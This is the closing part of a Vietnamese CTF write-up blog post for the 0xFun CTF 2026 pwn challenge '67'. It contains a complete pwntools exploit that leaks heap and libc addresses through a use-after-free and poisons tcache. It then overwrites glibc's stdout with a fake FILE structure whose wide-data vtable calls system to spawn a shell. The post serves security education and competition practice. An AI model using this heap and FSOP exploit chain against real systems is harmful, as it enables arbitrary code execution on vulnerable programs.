<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="string">b&#x27;5&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, <span class="string">b&#x27;D&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;6&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, <span class="string">b&#x27;D&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">io_stdout = (libc.sym._IO_2_1_stdout_) ^ heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;6&#x27;</span>, p64(io_stdout))</span><br><span class="line">create(<span class="string">b&#x27;7&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, <span class="string">b&#x27;D&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">w_offset = <span class="number">0xE0</span></span><br><span class="line">fs = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="string">b&#x27; sh&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">        <span class="number">0x88</span>: p64(libc.address + <span class="number">0x1e9790</span>),</span><br><span class="line">        <span class="number">0xA0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># 0xA0 — đặt _wide_data trỏ vào stdout + 0xE0 (wide data giả) (wide data đóng vai trò giống _IO_wfile_jumps)</span></span><br><span class="line">        <span class="number">0xC0</span>: p32(-<span class="number">1</span>, sign=<span class="string">&quot;signed&quot;</span>), <span class="comment"># 0xC0 — set _mode = -1 để ép đi vào nhánh wide-oriented</span></span><br><span class="line">        <span class="number">0xD8</span>: libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># 0xD8 — đặt vtable của stdout về _IO_wfile_jumps (hợp lệ để qua check, chứ k quan trọng trog việc gọi shell)</span></span><br><span class="line">        w_offset+<span class="number">0xE0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># w_offset + 0xE0 — set _wide_vtable trỏ về chính wide_data (+0xE0 tiếp theo: là offset bên trong struct _IO_wide_data, nơi chứa con trỏ _wide_vtable.)</span></span><br><span class="line">        w_offset+<span class="number">0x68</span>: p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment"># w_offset + 0x68 — nhét system vào slot __doallocate trog wide data giả (stdout + 0xE0)</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">create(<span class="string">b&#x27;8&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, fs)</span><br></pre></td></tr></table></figure>

<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;terminator&quot;</span>, <span class="string">&quot;--geometry=960x1000+960+500&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">exe = ELF(<span class="string">&#x27;./chall_patched&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># exe = ELF(&#x27;./chall&#x27;, checksec=False)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line">info = <span class="keyword">lambda</span> msg: log.info(msg)</span><br><span class="line">s = <span class="keyword">lambda</span> data, proc=<span class="literal">None</span>: proc.send(data) <span class="keyword">if</span> proc <span class="keyword">else</span> p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> msg, data, proc=<span class="literal">None</span>: proc.sendafter(msg, data) <span class="keyword">if</span> proc <span class="keyword">else</span> p.sendafter(msg, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data, proc=<span class="literal">None</span>: proc.sendline(data) <span class="keyword">if</span> proc <span class="keyword">else</span> p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> msg, data, proc=<span class="literal">None</span>: proc.sendlineafter(msg, data) <span class="keyword">if</span> proc <span class="keyword">else</span> p.sendlineafter(msg, data)</span><br><span class="line">sn = <span class="keyword">lambda</span> num, proc=<span class="literal">None</span>: proc.send(<span class="built_in">str</span>(num).encode()) <span class="keyword">if</span> proc <span class="keyword">else</span> p.send(<span class="built_in">str</span>(num).encode())</span><br><span class="line">sna = <span class="keyword">lambda</span> msg, num, proc=<span class="literal">None</span>: proc.sendafter(msg, <span class="built_in">str</span>(num).encode()) <span class="keyword">if</span> proc <span class="keyword">else</span> p.sendafter(msg, <span class="built_in">str</span>(num).encode())</span><br><span class="line">sln = <span class="keyword">lambda</span> num, proc=<span class="literal">None</span>: proc.sendline(<span class="built_in">str</span>(num).encode()) <span class="keyword">if</span> proc <span class="keyword">else</span> p.sendline(<span class="built_in">str</span>(num).encode())</span><br><span class="line">slna = <span class="keyword">lambda</span> msg, num, proc=<span class="literal">None</span>: proc.sendlineafter(msg, <span class="built_in">str</span>(num).encode()) <span class="keyword">if</span> proc <span class="keyword">else</span> p.sendlineafter(msg, <span class="built_in">str</span>(num).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        set max-visualize-chunk-size 0x500</span></span><br><span class="line"><span class="string">        b*0x0000555555555707</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.0xfun.org&#x27;</span>, <span class="number">41640</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([exe.path])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, data</span>):</span><br><span class="line">    sa(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Index: &#x27;</span>, idx)</span><br><span class="line">    sa(<span class="string">b&#x27;Size: &#x27;</span>, size)</span><br><span class="line">    sa(<span class="string">b&#x27;Data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Index: &#x27;</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Index: &#x27;</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sa(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Index: &#x27;</span>, idx)</span><br><span class="line">    sa(<span class="string">b&#x27;New Data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Step 1:</span></span><br><span class="line">create(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">read(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">f&#x27;Heap base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&#x27;</span>)</span><br><span class="line">heap_size0 = heap_base + <span class="number">0x300</span> <span class="comment"># chall: 0x290, chall_patched: 0x300</span></span><br><span class="line">info(<span class="string">f&#x27;Heap size0: <span class="subst">&#123;<span class="built_in">hex</span>(heap_size0)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Step 2:</span></span><br><span class="line">create(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;2&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>, p64(heap_size0 ^ heap_base &gt;&gt; <span class="number">12</span>))</span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line">create(<span class="string">B&#x27;3&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;4&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Step 3:</span></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, p8(<span class="number">0</span>) * <span class="number">8</span> + p64(<span class="number">0x401</span>)) <span class="comment"># 0x401 : 1024</span></span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line">read(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x1e7b20</span></span><br><span class="line">info(<span class="string">f&#x27;Libc leak: <span class="subst">&#123;<span class="built_in">hex</span>(libc_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">info(<span class="string">f&#x27;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># # -------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Step 4:</span></span><br><span class="line">create(<span class="string">b&#x27;5&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, <span class="string">b&#x27;D&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;6&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, <span class="string">b&#x27;D&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line">io_stdout = (libc.sym._IO_2_1_stdout_) ^ heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;6&#x27;</span>, p64(io_stdout))</span><br><span class="line">create(<span class="string">b&#x27;7&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, <span class="string">b&#x27;D&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">w_offset = <span class="number">0xE0</span></span><br><span class="line">fs = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="string">b&#x27; sh&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">        <span class="number">0x88</span>: p64(libc.address + <span class="number">0x1e9790</span>),</span><br><span class="line">        <span class="number">0xA0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># 0xA0 — đặt _wide_data trỏ vào stdout + 0xE0 (wide data giả) (wide data đóng vai trò giống _IO_wfile_jumps)</span></span><br><span class="line">        <span class="number">0xC0</span>: p32(-<span class="number">1</span>, sign=<span class="string">&quot;signed&quot;</span>), <span class="comment"># 0xC0 — set _mode = -1 để ép đi vào nhánh wide-oriented</span></span><br><span class="line">        <span class="number">0xD8</span>: libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># 0xD8 — đặt vtable của stdout về _IO_wfile_jumps (hợp lệ để qua check, chứ k quan trọng trog việc gọi shell)</span></span><br><span class="line">        w_offset+<span class="number">0xE0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># w_offset + 0xE0 — set _wide_vtable trỏ về chính wide_data (+0xE0 tiếp theo: là offset bên trong struct _IO_wide_data, nơi chứa con trỏ _wide_vtable.)</span></span><br><span class="line">        w_offset+<span class="number">0x68</span>: p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment"># w_offset + 0x68 — nhét system vào slot __doallocate trog wide data giả (stdout + 0xE0)</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line">create(<span class="string">b&#x27;8&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>, fs)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2026/02/16/2025/ctf/0xfun/wu/">https://elliotbigfan.github.io/2026/02/16/2025/ctf/0xfun/wu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/0xfun/poster.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026"><img class="cover" src="/img/ctf/uof/poster.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Writeup: Uof CTF 2026</div></div><div class="info-2"><div class="info-item-1">Web | No QuotesHướng giải Bài này là combo SQLi (bypass no quotes) –&gt; UNION để trả về username chứa payload → SSTI Jinja2 ở /home–&gt; chạy /readflag để lấy flag.  1. Điểm yếu trong code  SQLi ở /login Query được ghép thẳng:  12SELECT id, username FROM usersWHERE username = (&#x27;&#123;username&#125;&#x27;) AND password = (&#x27;&#123;password&#125;&#x27;)   WAF chỉ chặn &#39; và &quot;, nên vẫn còn đường khác.  SSTI ở /home   1return render_template_string(open(&quot;templates/home.html&...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img class="cover" src="/img/ctf/lakectf/poster.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">Writeup: LakeCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích qua file server.js, file xử lý chính của challenge:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990app.get(&#x27;/api/balance&#x27;, (req, res) =&gt; &#123;    res.json(&#...</div></div></div></a><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a><a class="pagination-related" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img class="cover" src="/img/ctf/backdoor/logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">Writeup: BackdoorCTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: Devil’s Convergence1. Phân tích chương trình: Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:  initialize : khỏi tạo giá trị cho biến toàn cục contract_seal là địa chỉ libc của hàm system và thực thi các hàm setvbuf. control_manipulation: Encode XOR data người dùng truyền vào buf với nửa phần đầu giá trị của biến contract_seal. war_devils_prophecy:  Encode XOR data người dùng truyền vào buf với nửa phần sau giá trị của biến co...</div></div></div></a><a class="pagination-related" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026"><img class="cover" src="/img/ctf/uof/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-19</div><div class="info-item-2">Writeup: Uof CTF 2026</div></div><div class="info-2"><div class="info-item-1">Web | No QuotesHướng giải Bài này là combo SQLi (bypass no quotes) –&gt; UNION để trả về username chứa payload → SSTI Jinja2 ở /home–&gt; chạy /readflag để lấy flag.  1. Điểm yếu trong code  SQLi ở /login Query được ghép thẳng:  12SELECT id, username FROM usersWHERE username = (&#x27;&#123;username&#125;&#x27;) AND password = (&#x27;&#123;password&#125;&#x27;)   WAF chỉ chặn &#39; và &quot;, nên vẫn còn đường khác.  SSTI ở /home   1return render_template_string(open(&quot;templates/home.html&...</div></div></div></a><a class="pagination-related" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img class="cover" src="/img/ctf/asis/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">Writeup: ASIS CTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Bookmarks Phân tích file app.py, ta có thể thấy bug CLRF injection nằm ở hàm dashboard và hoàn toàn có thể tận dụng bug này để gây ra XSS.  1234567891011121314151617181920@app.route(&quot;/dashboard&quot;, methods=[&#x27;GET&#x27;])def dashboard():    user_id = session.get(&quot;user_id&quot;)    if not user_id:        return &quot;User not logged&quot;, 400    username = None    with sqlite3.connect(DB_NAME) as conn:        cur = conn.execute(&quot;SELECT username FROM users WHERE id =...</div></div></div></a><a class="pagination-related" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img class="cover" src="/img/ctf/holactf/poster.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-02</div><div class="info-item-2">Writeup: HolaCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Hell EHCIntroduction Đây là một challenge liên quan đến lỗ hổng Deserialization và Wrapper phar:&#x2F;&#x2F; trong PHP (PHP Phar deserialization) Link tải challenge: hell-ehc Cách chạy challenge:  12345# 1. build imagedocker build -t hell_ehc .# 2. Run containerdocker run -it --rm -p 5005:80 hell_ehc  Solution1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn Vì challenge có cho tính năng upload file nên ta sẽ thử kiểm tra liệu có thể tận dụng điều này để upload trực tiếp webshell và ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-67"><span class="toc-number">1.</span> <span class="toc-text">Pwn | 67</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phan-tich-challenge"><span class="toc-number">1.1.</span> <span class="toc-text">Phân tích challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.2.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC"><span class="toc-number">1.3.</span> <span class="toc-text">PoC</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/16/2025/ctf/0xfun/wu/" title="Writeup: 0xFun CTF 2026"><img src="/img/ctf/0xfun/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: 0xFun CTF 2026"/></a><div class="content"><a class="title" href="/2026/02/16/2025/ctf/0xfun/wu/" title="Writeup: 0xFun CTF 2026">Writeup: 0xFun CTF 2026</a><time datetime="2026-02-16T02:32:18.000Z" title="Created 2026-02-16 09:32:18">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026"><img src="/img/ctf/uof/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: Uof CTF 2026"/></a><div class="content"><a class="title" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026">Writeup: Uof CTF 2026</a><time datetime="2026-01-19T09:21:56.000Z" title="Created 2026-01-19 16:21:56">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN"><img src="/img/research/web/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Research: Bypass Werkzeug Debug PIN"/></a><div class="content"><a class="title" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN">Research: Bypass Werkzeug Debug PIN</a><time datetime="2026-01-18T13:31:56.000Z" title="Created 2026-01-18 20:31:56">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img src="/img/ctf/asis/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: ASIS CTF 2025"/></a><div class="content"><a class="title" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025">Writeup: ASIS CTF 2025</a><time datetime="2026-01-14T08:07:34.000Z" title="Created 2026-01-14 15:07:34">2026-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/Research/pwn/fsop/" title="Research: File Stream Oriented Programming (FSOP)"><img src="/img/research/pwn/fsop/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Research: File Stream Oriented 